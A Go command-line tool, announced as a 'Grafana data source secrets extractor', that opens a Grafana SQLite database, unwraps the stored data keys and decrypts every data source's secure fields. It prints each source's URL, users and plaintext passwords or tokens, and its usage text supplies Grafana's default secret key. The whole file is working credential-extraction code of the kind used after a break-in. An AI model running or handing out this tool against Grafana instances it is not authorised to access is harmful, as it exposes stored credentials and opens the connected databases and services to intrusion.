package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/sha256"
	"database/sql"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"hash"
	"log"
	"os"

	_ "modernc.org/sqlite"
	//_ "github.com/mattn/go-sqlite3"
)

// DataSource represents a record from the data_source table
type DataSource struct {
	Name           string
	User           string
	BasicAuthUser  string
	URL            string
	Type           string
	SecureJsonData map[string]interface{}
}

// DataKey represents a record from the data_keys table
type DataKey struct {
	Name          string
	EncryptedData string
}

const (
	SaltLength                   = 8
	keyIdDelimiter               = '#'
	encryptionAlgorithmDelimiter = '*'
)

var b64 = base64.RawStdEncoding

func main() {
	if len(os.Args) != 3 {
		fmt.Println("Grafana data source secrets extractor")
		fmt.Println("Usage: decryptor <grafana.db> <secret>")
		fmt.Println("Default grafana secret is SW2YcwTIb9zpOOhoPsMm")
		os.Exit(1)
	}

	dbFile := os.Args[1]
	secret := os.Args[2]

	if _, err := os.Stat(dbFile); os.IsNotExist(err) {
		fmt.Printf("Error: database file %s does not exist\n", dbFile)
		os.Exit(1)
	}

	// db, err := sql.Open("sqlite3", dbFile)
	db, err := sql.Open("sqlite", dbFile)
	if err != nil {
		log.Fatalf("Failed to open database: %v", err)
	}
	defer db.Close()

	dataSources, err := getDataSources(db)
	if err != nil {
		log.Fatal(err)
	}

	for _, ds := range dataSources {
		fmt.Printf("Processing data source: %s\n", ds.Name)

		for key, value := range ds.SecureJsonData {
			strValue, ok := value.(string)
			if !ok {
				continue
			}

			keyId := GetKeyId(strValue)
			if keyId == "" {
				continue
			}

			// fmt.Printf("  Field: %s, KeyID: %s\n", key, keyId)

			dataKey, err := getDataKey(db, keyId)
			if err != nil {
				log.Printf("    Error retrieving key: %v", err)
				continue
			}

			// fmt.Printf("    Found key: %s\n", dataKey.Name)
			// fmt.Printf("    Encrypted password: %s\n", strValue)
			// fmt.Printf("    Encrypted key data: %s\n", dataKey.EncryptedData)

			decrypted := DecryptValue(strValue, dataKey.EncryptedData, secret)

			fmt.Printf("  Type: %s\n", ds.Type)
			fmt.Printf("  URL: %s\n", ds.URL)
			fmt.Printf("  User: %s\n", ds.User)
			fmt.Printf("  BasicAuthUser: %s\n", ds.BasicAuthUser)
			fmt.Printf("  Key: %s\n", key)
			fmt.Printf("  Decrypted secret: %s\n", decrypted)
		}
	}
}

// GetKeyId extracts the key ID from encrypted payload
func GetKeyId(encryptedValue string) string {
	payload, err := base64.StdEncoding.DecodeString(encryptedValue)
	if err != nil {
		fmt.Printf("Error decoding base64: %v\n", err)
		return ""
	}

	if len(payload) < 1 {
		return ""
	}

	payload = payload[1:] // Skip first byte
	endOfKey := bytes.Index(payload, []byte{keyIdDelimiter})
	if endOfKey == -1 {
		return ""
	}

	b64Key := payload[:endOfKey]
	keyId := make([]byte, b64.DecodedLen(len(b64Key)))
	n, err := b64.Decode(keyId, b64Key)
	if err != nil {
		return ""
	}

	return string(keyId[:n])
}

func getDataSources(db *sql.DB) ([]DataSource, error) {
	rows, err := db.Query("SELECT name, url, type, user, basic_auth_user, secure_json_data FROM data_source")
	if err != nil {
		return nil, fmt.Errorf("query error: %v", err)
	}
	defer rows.Close()

	var dataSources []DataSource

	for rows.Next() {
		var ds DataSource
		var secureJsonDataStr string

		if err := rows.Scan(&ds.Name, &ds.URL, &ds.Type, &ds.User, &ds.BasicAuthUser, &secureJsonDataStr); err != nil {
			return nil, fmt.Errorf("row scan error: %v", err)
		}

		ds.SecureJsonData = make(map[string]interface{})
		if secureJsonDataStr != "" {
			if err := json.Unmarshal([]byte(secureJsonDataStr), &ds.SecureJsonData); err != nil {
				return nil, fmt.Errorf("JSON parse error: %v", err)
			}
		}

		dataSources = append(dataSources, ds)
	}

	if err := rows.Err(); err != nil {
		return nil, err
	}

	return dataSources, nil
}

func getDataKey(db *sql.DB, name string) (DataKey, error) {
	var dataKey DataKey
	err := db.QueryRow(
		"SELECT name, hex(encrypted_data) FROM data_keys WHERE name = ?",
		name,
	).Scan(&dataKey.Name, &dataKey.EncryptedData)

	if err != nil {
		return DataKey{}, fmt.Errorf("key not found (name=%s): %v", name, err)
	}

	return dataKey, nil
}

// DecryptValue decrypts the encrypted password using the encrypted key and secret
func DecryptValue(encryptedPassword, encryptedKeyHex, secret string) string {
	payload, err := base64.StdEncoding.DecodeString(encryptedPassword)
	if err != nil {
		log.Fatalf("Base64 decode error: %v", err)
	}

	dataKey, err := hex.DecodeString(encryptedKeyHex)
	if err != nil {
		log.Fatalf("Hex decode error: %v", err)
	}

	// Extract key ID from payload
	payload = payload[1:] // Skip first byte
	endOfKey := bytes.Index(payload, []byte{keyIdDelimiter})
	if endOfKey == -1 {
		log.Fatal("Invalid payload format - missing key delimiter")
	}
	payload = payload[endOfKey+1:]

	// Handle encryption algorithm marker if present
	if len(payload) > 0 && payload[0] == encryptionAlgorithmDelimiter {
		payload = payload[1:]
		endOfAlg := bytes.Index(payload, []byte{encryptionAlgorithmDelimiter})
		if endOfAlg == -1 {
			log.Fatal("Invalid algorithm specification")
		}
		payload = payload[endOfAlg+1:]
	}

	// Handle encryption algorithm in data key if present
	if len(dataKey) > 0 && dataKey[0] == encryptionAlgorithmDelimiter {
		dataKey = dataKey[1:]
		endOfAlg := bytes.Index(dataKey, []byte{encryptionAlgorithmDelimiter})
		if endOfAlg == -1 {
			log.Fatal("Invalid algorithm specification in data key")
		}
		dataKey = dataKey[endOfAlg+1:]
	}

	// First decrypt the data key using the secret
	decryptedDataKey, err := Decrypt(dataKey, secret)
	if err != nil {
		log.Fatalf("Data key decryption failed: %v", err)
	}

	// Then decrypt the actual payload using the decrypted data key
	decrypted, err := Decrypt(payload, string(decryptedDataKey))
	if err != nil {
		log.Fatalf("Payload decryption failed: %v", err)
	}

	return string(decrypted)
}

// Key derives an encryption key from password and salt
func Key(password, salt []byte, iterations, keyLen int, h func() hash.Hash) []byte {
	prf := hmac.New(h, password)
	hashLen := prf.Size()
	numBlocks := (keyLen + hashLen - 1) / hashLen

	var buf [4]byte
	dk := make([]byte, 0, numBlocks*hashLen)
	U := make([]byte, hashLen)

	for block := 1; block <= numBlocks; block++ {
		prf.Reset()
		prf.Write(salt)
		buf[0] = byte(block >> 24)
		buf[1] = byte(block >> 16)
		buf[2] = byte(block >> 8)
		buf[3] = byte(block)
		prf.Write(buf[:4])
		dk = prf.Sum(dk)
		T := dk[len(dk)-hashLen:]
		copy(U, T)

		for n := 2; n <= iterations; n++ {
			prf.Reset()
			prf.Write(U)
			U = U[:0]
			U = prf.Sum(U)
			for x := range U {
				T[x] ^= U[x]
			}
		}
	}
	return dk[:keyLen]
}

// Decrypt performs the actual decryption
func Decrypt(payload []byte, secret string) ([]byte, error) {
	if len(payload) < SaltLength {
		return nil, errors.New("payload too short for salt")
	}

	salt := payload[:SaltLength]
	key, err := DeriveKey(secret, string(salt))
	if err != nil {
		return nil, err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	return decryptCFB(block, payload)
}

// DeriveKey creates an encryption key from secret and salt
func DeriveKey(secret, salt string) ([]byte, error) {
	return Key([]byte(secret), []byte(salt), 10000, 32, sha256.New), nil
}

// decryptCFB decrypts using CFB mode
func decryptCFB(block cipher.Block, payload []byte) ([]byte, error) {
	if len(payload) < SaltLength+aes.BlockSize {
		return nil, errors.New("payload too short for IV")
	}

	iv := payload[SaltLength : SaltLength+aes.BlockSize]
	payload = payload[SaltLength+aes.BlockSize:]
	plaintext := make([]byte, len(payload))

	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(plaintext, payload)
	return plaintext, nil
}
